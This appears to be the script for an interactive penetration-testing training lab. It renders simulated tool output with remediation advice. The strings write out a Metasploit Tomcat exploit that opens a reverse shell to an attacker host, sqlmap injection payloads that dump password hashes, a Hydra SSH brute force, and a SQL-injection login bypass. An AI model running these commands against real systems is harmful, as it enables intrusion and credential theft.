        document.addEventListener('DOMContentLoaded', function() {
            // Hide lab content initially
            document.getElementById('lab-content').style.display = 'none';
        });

        // Lab tab navigation
        function showTab(tabId) {
            // Hide all tabs
            const labContainers = document.querySelectorAll('.lab-container');
            labContainers.forEach(container => {
                container.classList.remove('lab-active');
            });

            // Show selected tab
            document.getElementById(tabId).classList.add('lab-active');

            // Update active tab button
            const tabButtons = document.querySelectorAll('.lab-tab');
            tabButtons.forEach(button => {
                button.classList.remove('active');
                if (button.getAttribute('data-tab') === tabId) {
                    button.classList.add('active');
                }
            });

            // Update progress bar
            updateProgress(tabId);
        }

        // Tab click event
        const tabButtons = document.querySelectorAll('.lab-tab');
        tabButtons.forEach(button => {
            button.addEventListener('click', function() {
                const tabId = this.getAttribute('data-tab');
                showTab(tabId);
            });
        });

        // Start lab environment
        function startLab() {
            document.getElementById('start-lab-btn').style.display = 'none';
            document.getElementById('lab-content').style.display = 'block';
            document.getElementById('progress-bar').style.width = '16%';
        }

        // Select network node
        function selectNode(nodeId) {
            // Hide all node details
            const nodeDetails = document.querySelectorAll('.network-details');
            nodeDetails.forEach(detail => {
                detail.classList.remove('active');
            });

            // Show selected node details
            document.getElementById(nodeId + '-details').classList.add('active');

            // Update node status to online
            const nodes = document.querySelectorAll('.network-node');
            nodes.forEach(node => {
                if (node.getAttribute('data-node') === nodeId) {
                    const statusIndicator = node.querySelector('.node-status');
                    statusIndicator.classList.remove('unknown');
                    statusIndicator.classList.add('online');
                }
            });
        }

        // Use penetration testing tool
        function useTool(toolId) {
            // Show tool output
            document.getElementById('tool-output').style.display = 'flex';

            // Set terminal title
            let terminalTitle = 'Terminal';
            let terminalContent = '';
            let exploitResults = '';

            switch(toolId) {
                case 'metasploit':
                    terminalTitle = 'Metasploit Framework';
                    terminalContent = generateMetasploitOutput();
                    exploitResults = generateMetasploitResults();
                    break;
                case 'sqlmap':
                    terminalTitle = 'SQLMap';
                    terminalContent = generateSQLMapOutput();
                    exploitResults = generateSQLMapResults();
                    break;
                case 'hydra':
                    terminalTitle = 'Hydra';
                    terminalContent = generateHydraOutput();
                    exploitResults = generateHydraResults();
                    break;
                case 'burp':
                    terminalTitle = 'Burp Suite';
                    terminalContent = generateBurpOutput();
                    exploitResults = generateBurpResults();
                    break;
            }

            document.getElementById('tool-terminal-title').textContent = terminalTitle;
            document.getElementById('tool-terminal').innerHTML = terminalContent;
            document.getElementById('exploit-results').innerHTML = exploitResults;
        }

        // Generate Metasploit output
        function generateMetasploitOutput() {
            return `<div>root@kali:~# <span style="color: #63E2FF;">msfconsole</span></div>
            <div style="color: #ABABAB; margin-top: 10px;">
                Starting the Metasploit Framework Console...<br>
                * Documentation: https://docs.metasploit.com/<br><br>

                 _                                                    _<br>
                | |      _____   _____ _ __  ___  ___ ___  _ __   __| |<br>
                | |     / _ \\ \\ / / _ \\ '_ \\/ __|/ __/ _ \\| '_ \\ / _\` |<br>
                | |___ | (_) \\ V /  __/ | | \\__ \\ (_| (_) | | | | (_| |<br>
                |_____| \\___/ \\_/ \\___|_| |_|___/\\___\\___/|_| |_|\\__,_|<br><br>


                       =[ metasploit v6.3.4-dev                          ]<br>
                + -- --=[ 2255 exploits - 1190 auxiliary - 404 post       ]<br>
                + -- --=[ 951 payloads - 45 encoders - 11 nops            ]<br>
                + -- --=[ 9 evasion                                       ]<br><br>

                Metasploit tip: Use sessions -i [#] to interact with a session<br><br>

                msf6 > <span style="color: #63E2FF;">search type:exploit name:tomcat</span><br>

                Matching Modules<br>
                ================<br><br>

                   #  Name                                        Disclosure Date  Rank       Check  Description<br>
                   -  ----                                        ---------------  ----       -----  -----------<br>
                   0  exploit/multi/http/tomcat_mgr_deploy        2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution<br>
                   1  exploit/multi/http/tomcat_mgr_upload        2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution<br>
                   2  exploit/windows/http/tomcat_cgi_cmdlineargs 2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Remote Code Execution<br><br>

                msf6 > <span style="color: #63E2FF;">use exploit/multi/http/tomcat_mgr_deploy</span><br>
                [*] No payload configured, defaulting to java/meterpreter/reverse_tcp<br><br>

                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set RHOSTS 192.168.1.20</span><br>
                RHOSTS => 192.168.1.20<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set RPORT 8080</span><br>
                RPORT => 8080<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set TARGETURI /manager</span><br>
                TARGETURI => /manager<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set USERNAME tomcat</span><br>
                USERNAME => tomcat<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set PASSWORD s3cret</span><br>
                PASSWORD => s3cret<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">set LHOST 192.168.1.100</span><br>
                LHOST => 192.168.1.100<br>
                msf6 exploit(multi/http/tomcat_mgr_deploy) > <span style="color: #63E2FF;">exploit</span><br><br>

                [*] Started reverse TCP handler on 192.168.1.100:4444 <br>
                [*] Attempting to deploy WAR file...<br>
                [*] Uploading WAR file MDNzCnMx.war...<br>
                [*] Executing MDNzCnMx.war...<br>
                [*] Undeploying MDNzCnMx.war ...<br>
                [*] Sending stage (58829 bytes) to 192.168.1.20<br>
                [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.20:49212) at 2025-04-07 16:05:37 -0400<br><br>

                meterpreter > <span style="color: #63E2FF;">getuid</span><br>
                Server username: tomcat<br>
                meterpreter > <span style="color: #63E2FF;">sysinfo</span><br>
                Computer    : www.acmesecuretech.lab<br>
                OS          : Ubuntu 20.04.4 LTS (Linux 5.4.0-120-generic)<br>
                Meterpreter : java/linux<br>
                meterpreter > <span style="color: #63E2FF;">shell</span><br>
                Process 2 created.<br>
                Channel 1 created.<br>
                id<br>
                uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)<br>
            </div>`;
        }

        // Generate Metasploit results
        function generateMetasploitResults() {
            return `
            <div style="background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
                <h3 style="margin-bottom: 20px; color: var(--primary-color);">Exploitation Results: Tomcat Manager</h3>

                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Vulnerability Details:</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Target:</strong> Apache Tomcat (192.168.1.20:8080)</li>
                        <li><strong>Vulnerability:</strong> Default credentials in Tomcat Manager</li>
                        <li><strong>Exploit:</strong> Authenticated code execution via WAR file deployment</li>
                        <li><strong>Result:</strong> Successful exploitation (Meterpreter session established)</li>
                    </ul>
                </div>

                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Impact:</h4>
                    <p>The successful exploitation provides command execution on the web server with tomcat user privileges. This allows an attacker to:</p>
                    <ul style="margin-left: 20px;">
                        <li>Access and modify web application files</li>
                        <li>Potentially escalate privileges to obtain root access</li>
                        <li>Use the server as a pivot point to attack other systems on the network</li>
                        <li>Deploy persistent backdoors for continued access</li>
                    </ul>
                </div>

                <div>
                    <h4 style="margin-bottom: 10px;">Remediation:</h4>
                    <ol style="margin-left: 20px;">
                        <li>Change default credentials for the Tomcat Manager</li>
                        <li>Implement IP restrictions for access to the management interface</li>
                        <li>Consider using a stronger authentication mechanism</li>
                        <li>Regularly audit user accounts and remove unnecessary access</li>
                    </ol>
                </div>
            </div>`;
        }

        // Generate SQLMap output
        function generateSQLMapOutput() {
            return `<div>root@kali:~# <span style="color: #63E2FF;">sqlmap -u "http://192.168.1.25/login.php" --forms --batch</span></div>
            <div style="color: #ABABAB; margin-top: 10px;">
                        ___<br>
                       __H__<br>
                 ___ ___[']_____ ___ ___  {1.6.12.35#dev}<br>
                |_ -| . [,]     | .'| . |<br>
                |___|_  [']_|_|_|__,|  _|<br>
                      |_|V...       |_|   <br><br>

                [*] starting @ 16:10:18 /2025-04-07/<br>
                [16:10:18] [INFO] testing connection to the target URL<br>
                [16:10:18] [INFO] searching for forms<br>
                [16:10:19] [INFO] found a total of 1 form(s)<br>
                [16:10:19] [INFO] testing form with (username='admin' and password='admin')<br>
                [16:10:20] [INFO] checking if the target is protected by some kind of WAF/IPS<br>
                [16:10:20] [INFO] testing if the target URL content is stable<br>
                [16:10:21] [INFO] target URL content is stable<br>
                [16:10:21] [INFO] testing if POST parameter 'username' is dynamic<br>
                [16:10:21] [INFO] confirming that POST parameter 'username' is dynamic<br>
                [16:10:22] [INFO] POST parameter 'username' appears to be dynamic<br>
                [16:10:22] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')<br>
                [16:10:22] [INFO] testing for SQL injection on POST parameter 'username'<br>
                [16:10:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'<br>
                [16:10:24] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable <br>
                [16:10:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'<br>
                [16:10:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'<br>
                [16:10:27] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable<br>
                [16:10:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'<br>
                [16:10:29] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable<br>
                [16:10:29] [INFO] checking if the injection point on POST parameter 'username' is a false positive<br>
                POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N<br>
                sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:<br>
                ---<br>
                Parameter: username (POST)<br>
                    Type: boolean-based blind<br>
                    Title: AND boolean-based blind - WHERE or HAVING clause<br>
                    Payload: username=admin' AND 9037=9037 AND 'JaRH'='JaRH&password=admin<br>

                    Type: error-based<br>
                    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)<br>
                    Payload: username=admin' AND EXTRACTVALUE(1983,CONCAT(0x5c,0x7162787a71,(SELECT (ELT(1983=1983,1))),0x7170707871)) AND 'bSQH'='bSQH&password=admin<br>

                    Type: time-based blind<br>
                    Title: MySQL >= 5.0.12 AND time-based blind<br>
                    Payload: username=admin' AND SLEEP(5) AND 'wUtW'='wUtW&password=admin<br>

                    Type: UNION query<br>
                    Title: Generic UNION query (NULL) - 3 columns<br>
                    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x7162787a71,0x7559754c466d734f786f6b57574e4f7458774b6f6c6b71764f454f526a6c507753676950796361,0x7170707871)-- -&password=admin<br>
                ---<br>
                [16:10:33] [INFO] the back-end DBMS is MySQL<br>
                [16:10:33] [INFO] fetching banner<br>
                [16:10:34] [INFO] retrieved: '8.0.27-0ubuntu0.20.04.1'<br>
                back-end DBMS: MySQL 8.0.27<br>
                banner: '8.0.27-0ubuntu0.20.04.1'<br>
                [16:10:34] [INFO] fetching current database<br>
                [16:10:34] [INFO] retrieved: 'employee_portal'<br>
                current database: 'employee_portal'<br><br>

                root@kali:~# <span style="color: #63E2FF;">sqlmap -u "http://192.168.1.25/login.php" --forms --dbs</span><br>
                <br>
                [cut for brevity]<br><br>

                available databases [2]:<br>
                [*] employee_portal<br>
                [*] information_schema<br><br>

                root@kali:~# <span style="color: #63E2FF;">sqlmap -u "http://192.168.1.25/login.php" --forms -D employee_portal --tables</span><br>
                <br>
                [cut for brevity]<br><br>

                Database: employee_portal<br>
                [3 tables]<br>
                +---------------+<br>
                | employees     |<br>
                | login_attempts|<br>
                | users         |<br>
                +---------------+<br><br>

                root@kali:~# <span style="color: #63E2FF;">sqlmap -u "http://192.168.1.25/login.php" --forms -D employee_portal -T users --columns</span><br>
                <br>
                [cut for brevity]<br><br>

                Database: employee_portal<br>
                Table: users<br>
                [6 columns]<br>
                +----------+-------------+<br>
                | Column   | Type        |<br>
                +----------+-------------+<br>
                | id       | int         |<br>
                | username | varchar(50) |<br>
                | password | varchar(255)|<br>
                | email    | varchar(100)|<br>
                | role     | varchar(20) |<br>
                | created  | datetime    |<br>
                +----------+-------------+<br><br>

                root@kali:~# <span style="color: #63E2FF;">sqlmap -u "http://192.168.1.25/login.php" --forms -D employee_portal -T users -C username,password,role --dump</span><br>
                <br>
                [cut for brevity]<br><br>

                Database: employee_portal<br>
                Table: users<br>
                [3 entries]<br>
                +----------+----------------------------------+-------+<br>
                | username | password                         | role  |<br>
                +----------+----------------------------------+-------+<br>
                | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |<br>
                | john     | 482c811da5d5b4bc6d497ffa98491e38 | user  |<br>
                | sarah    | 8cb2237d0679ca88db6464eac60da96345513964 | user  |<br>
                +----------+----------------------------------+-------+<br>
            </div>`;
        }

        // Generate SQLMap results
        function generateSQLMapResults() {
            return `
            <div style="background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
                <h3 style="margin-bottom: 20px; color: var(--primary-color);">Exploitation Results: SQL Injection</h3>

                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Vulnerability Details:</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Target:</strong> Employee Portal Login Form (192.168.1.25/login.php)</li>
                        <li><strong>Vulnerability:</strong> SQL Injection in username parameter</li>
                        <li><strong>Exploit:</strong> Multiple SQL injection techniques (boolean-based, time-based, error-based, UNION query)</li>
                        <li><strong>Result:</strong> Successful extraction of database contents</li>
                    </ul>
                </div>

                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Extracted Information:</h4>
                    <p>The SQL injection vulnerability allowed the extraction of sensitive information from the database:</p>
                    <ul style="margin-left: 20px;">
                        <li><strong>Database Name:</strong> employee_portal</li>
                        <li><strong>Tables:</strong> users, employees, login_attempts</li>
                        <li><strong>User Credentials:</strong></li>
                    </ul>
                    <div class="code-block">
                    +----------+----------------------------------+-------+
                    | username | password (MD5/SHA1 hash)         | role  |
                    +----------+----------------------------------+-------+
                    | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
                    | john     | 482c811da5d5b4bc6d497ffa98491e38 | user  |
                    | sarah    | 8cb2237d0679ca88db6464eac60da96345513964 | user  |
                    +----------+----------------------------------+-------+
                    </div>
                </div>

                <div>
                    <h4 style="margin-bottom: 10px;">Remediation:</h4>
                    <ol style="margin-left: 20px;">
                        <li>Implement parameterized queries or prepared statements</li>
                        <li>Use an Object-Relational Mapping (ORM) framework</li>
                        <li>Validate and sanitize all user inputs</li>
                        <li>Implement proper error handling to avoid exposing database details</li>
                        <li>Use a Web Application Firewall (WAF) as an additional layer of protection</li>
                    </ol>
                </div>
            </div>`;
        }

        // Generate Hydra output
        function generateHydraOutput() {
            return `<div>root@kali:~# <span style="color: #63E2FF;">hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.35</span></div>
            <div style="color: #ABABAB; margin-top: 10px;">
                Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>

                Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 16:15:17<br>
                [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
                [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>
                [DATA] attacking ssh://192.168.1.35:22/<br>
                [STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:00h, 16 active<br>
                [STATUS] 170.00 tries/min, 510 tries in 00:03h, 14343889 to do in 1405:28h, 16 active<br>
                [22][ssh] host: 192.168.1.35   login: admin   password: password<br>
                [STATUS] attack finished for 192.168.1.35 (waiting for children to complete tests)<br>
                1 of 1 target successfully completed, 1 valid password found<br>
                Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 16:22:56<br><br>

                root@kali:~# <span style="color: #63E2FF;">ssh admin@192.168.1.35</span><br>
                admin@192.168.1.35's password: <span style="color: #63E2FF;">password</span><br>
                Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-120-generic x86_64)<br><br>

                 * Documentation:  https://help.ubuntu.com<br>
                 * Management:     https://landscape.canonical.com<br>
                 * Support:        https://ubuntu.com/advantage<br><br>

                Last login: Mon Apr 5 09:32:45 2025 from 192.168.1.100<br>
                admin@admin-server:~$ <span style="color: #63E2FF;">id</span><br>
                uid=1002(admin) gid=1002(admin) groups=1002(admin),27(sudo)<br>
                admin@admin-server:~$ <span style="color: #63E2FF;">sudo -l</span><br>
                [sudo] password for admin: <span style="color: #63E2FF;">password</span><br>
                Matching Defaults entries for admin on admin-server:<br>
                    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>

                User admin may run the following commands on admin-server:<br>
                    (ALL : ALL) ALL<br>
            </div>`;
        }

        // Generate Hydra results
        function generateHydraResults() {
            return `
                <div style="background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
                <h3 style="margin-bottom: 20px; color: var(--primary-color);">Exploitation Results: Weak Password</h3>
                
                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Vulnerability Details:</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Target:</strong> Admin Server SSH (192.168.1.35)</li>
                        <li><strong>Vulnerability:</strong> Weak authentication (simple password)</li>
                        <li><strong>Exploit:</strong> Password brute force using Hydra</li>
                        <li><strong>Result:</strong> Successful authentication with "admin:password" credentials</li>
                    </ul>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Access Obtained:</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>User:</strong> admin (UID 1002)</li>
                        <li><strong>Groups:</strong> admin, sudo</li>
                        <li><strong>Privileges:</strong> The admin user has full sudo access (can run commands as root)</li>
                    </ul>
                    <p>This level of access provides complete control over the admin server, allowing an attacker to:</p>
                    <ul style="margin-left: 20px;">
                        <li>Access all files on the system</li>
                        <li>Modify system configuration</li>
                        <li>Install backdoors or malicious software</li>
                        <li>Potentially pivot to other systems on the network</li>
                    </ul>
                </div>
                
                <div>
                    <h4 style="margin-bottom: 10px;">Remediation:</h4>
                    <ol style="margin-left: 20px;">
                        <li>Implement a strong password policy requiring complex passwords</li>
                        <li>Enable multi-factor authentication for SSH access</li>
                        <li>Limit sudo access to only necessary commands</li>
                        <li>Consider implementing SSH key-based authentication instead of password authentication</li>
                        <li>Implement account lockout after multiple failed login attempts</li>
                    </ol>
                </div>
            </div>`;
        }

        // Generate Burp output
        function generateBurpOutput() {
            return `<div>BURP SUITE PROFESSIONAL 2025.1</div>
            <div style="color: #ABABAB; margin-top: 10px;">
                <p style="margin-bottom: 10px;">[Target] > Site map > http://192.168.1.25</p>
                
                <p style="margin-bottom: 10px;">Selected items:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>http://192.168.1.25/login.php (POST)</li>
                </ul>
                
                <p style="margin-bottom: 10px;">[Scanner] > Active Scan</p>
                
                <p style="margin-bottom: 10px;">Scan details:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>Scan configuration: All active scan checks</li>
                    <li>Resource pool: Default</li>
                </ul>
                
                <p style="margin-bottom: 10px;">[Scanner] > Scan queue > Active scan - http://192.168.1.25</p>
                
                <p style="margin-bottom: 10px;">Scan progress:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>Status: Completed</li>
                    <li>Issues: 4</li>
                    <li>Requests: 1543</li>
                </ul>
                
                <p style="margin-bottom: 10px;">[Scanner] > Scan queue > Active scan - http://192.168.1.25 > Issues</p>
                
                <p style="margin-bottom: 10px;">Issue details:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>[High] SQL injection (Parameter: username)</li>
                    <li>[Medium] Cross-site scripting (XSS) (Parameter: username)</li>
                    <li>[Medium] Session token in URL</li>
                    <li>[Low] Cookie without HTTPOnly flag</li>
                </ul>
                
                <p style="margin-bottom: 10px;">[Scanner] > Scan queue > Active scan - http://192.168.1.25 > Issue details > SQL injection</p>
                
                <p style="margin-bottom: 10px;">Summary:</p>
                <p style="margin-left: 20px; margin-bottom: 10px;">The application appears to be vulnerable to SQL injection. The username parameter is vulnerable to SQL injection attacks. This might allow an attacker to modify SQL queries, bypass authentication, and extract data from the database.</p>
                
                <p style="margin-bottom: 10px;">Request:</p>
                <div style="margin-left: 20px; margin-bottom: 10px; font-family: monospace;">
                    POST /login.php HTTP/1.1<br>
                    Host: 192.168.1.25<br>
                    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36<br>
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>
                    Content-Type: application/x-www-form-urlencoded<br>
                    Content-Length: 46<br>
                    <br>
                    username=admin' OR 1=1 -- &password=anything
                </div>
                
                <p style="margin-bottom: 10px;">Response:</p>
                <div style="margin-left: 20px; margin-bottom: 10px; font-family: monospace;">
                    HTTP/1.1 302 Found<br>
                    Date: Wed, 07 Apr 2025 20:35:12 GMT<br>
                    Server: Apache/2.4.41 (Ubuntu)<br>
                    Location: dashboard.php<br>
                    Content-Length: 0<br>
                </div>
                
                <p style="margin-bottom: 10px;">Remediation advice:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>Use parameterized queries or prepared statements</li>
                    <li>Apply input validation</li>
                    <li>Use an ORM framework if possible</li>
                    <li>Implement proper error handling</li>
                    <li>Apply the principle of least privilege for database accounts</li>
                </ul>
            </div>`;
        }

        // Generate Burp results
        function generateBurpResults() {
            return `
            <div style="background-color: white; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow);">
                <h3 style="margin-bottom: 20px; color: var(--primary-color);">Vulnerability Scan Results</h3>
                
                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Target Information:</h4>
                    <ul style="margin-left: 20px;">
                        <li><strong>Target:</strong> Employee Portal (http://192.168.1.25)</li>
                        <li><strong>Scan Type:</strong> Active Vulnerability Scan</li>
                        <li><strong>Tool:</strong> Burp Suite Professional 2025.1</li>
                    </ul>
                </div>
                
                <div style="margin-bottom: 20px;">
                    <h4 style="margin-bottom: 10px;">Identified Vulnerabilities:</h4>
                    <div class="vulnerability-item">
                        <h5 style="display: flex; align-items: center; margin-bottom: 8px;">
                            <i class="fas fa-bug" style="margin-right: 10px; color: var(--danger-color);"></i>
                            SQL Injection <span class="severity high" style="margin-left: 10px;">High</span>
                        </h5>
                        <p>The login form is vulnerable to SQL injection attacks in the username parameter. This allows authentication bypass and unauthorized access to the application.</p>
                    </div>
                    
                    <div class="vulnerability-item" style="margin-top: 15px;">
                        <h5 style="display: flex; align-items: center; margin-bottom: 8px;">
                            <i class="fas fa-bug" style="margin-right: 10px; color: var(--warning-color);"></i>
                            Cross-site Scripting (XSS) <span class="severity medium" style="margin-left: 10px;">Medium</span>
                        </h5>
                        <p>The username parameter is vulnerable to stored XSS attacks, allowing attackers to inject malicious scripts that execute in users' browsers.</p>
                    </div>
                    
                    <div class="vulnerability-item" style="margin-top: 15px;">
                        <h5 style="display: flex; align-items: center; margin-bottom: 8px;">
                            <i class="fas fa-bug" style="margin-right: 10px; color: var(--warning-color);"></i>
                            Session Token in URL <span class="severity medium" style="margin-left: 10px;">Medium</span>
                        </h5>
                        <p>Session identifiers are included in URLs, making them vulnerable to theft through browser history, bookmarks, or referer headers.</p>
                    </div>
                    
                    <div class="vulnerability-item" style="margin-top: 15px;">
                        <h5 style="display: flex; align-items: center; margin-bottom: 8px;">
                            <i class="fas fa-bug" style="margin-right: 10px; color: var(--info-color);"></i>
                            Cookie without HTTPOnly Flag <span class="severity low" style="margin-left: 10px;">Low</span>
                        </h5>
                        <p>Session cookies do not have the HTTPOnly flag set, making them accessible to client-side scripts and vulnerable to theft via XSS attacks.</p>
                    </div>
                </div>
                
                <div>
                    <h4 style="margin-bottom: 10px;">Recommended Actions:</h4>
                    <ol style="margin-left: 20px;">
                        <li>Fix SQL injection by implementing parameterized queries</li>
                        <li>Implement input validation and output encoding to prevent XSS attacks</li>
                        <li>Use a server-side session management system that doesn't expose tokens in URLs</li>
                        <li>Set the HTTPOnly flag on all sensitive cookies</li>
                        <li>Consider implementing a Web Application Firewall as an additional layer of protection</li>
                    </ol>
                </div>
            </div>`;
        }

        // Run exploits
        function runExploits() {
            document.getElementById('run-exploits').style.display = 'none';
            document.getElementById('exploitation-results').style.display = 'block';
            document.getElementById('complete-exploitation').style.display = 'inline-block';

            // Update node status
            const nodes = document.querySelectorAll('.network-node');
            nodes.forEach(node => {
                const nodeId = node.getAttribute('data-node');
                if (nodeId === 'portal' || nodeId === 'www' || nodeId === 'admin') {
                    node.classList.add('vulnerable');
                    const statusIndicator = node.querySelector('.node-status');
                    statusIndicator.classList.remove('unknown');
                    statusIndicator.classList.add('online');
                }
            });

            // Update progress bar
            document.getElementById('progress-bar').style.width = '50%';
        }

        // Complete each phase
        function completeRecon() {
            showTab('scanning');
            document.getElementById('progress-bar').style.width = '33%';
        }

        function completeScanning() {
            showTab('exploitation');
            document.getElementById('progress-bar').style.width = '50%';
        }

        function completeExploitation() {
            showTab('post-exploit');
            document.getElementById('progress-bar').style.width = '66%';
        }

        function completePostExploit() {
            showTab('reporting');
            document.getElementById('progress-bar').style.width = '83%';
        }

        function completeLab() {
            document.getElementById('progress-bar').style.width = '100%';
            document.getElementById('progress-bar').parentNode.classList.add('success');
            alert('Congratulations! You have successfully completed the Penetration Testing Lab. Your certificate is ready!');
        }

        // Update progress based on tab
        function updateProgress(tabId) {
            switch(tabId) {
                case 'intro':
                    document.getElementById('progress-bar').style.width = '16%';
                    break;
                case 'recon':
                    document.getElementById('progress-bar').style.width = '33%';
                    break;
                case 'scanning':
                    document.getElementById('progress-bar').style.width = '50%';
                    break;
                case 'exploitation':
                    document.getElementById('progress-bar').style.width = '66%';
                    break;
                case 'post-exploit':
                    document.getElementById('progress-bar').style.width = '83%';
                    break;
                case 'reporting':
                    document.getElementById('progress-bar').style.width = '100%';
                    break;
            }
        }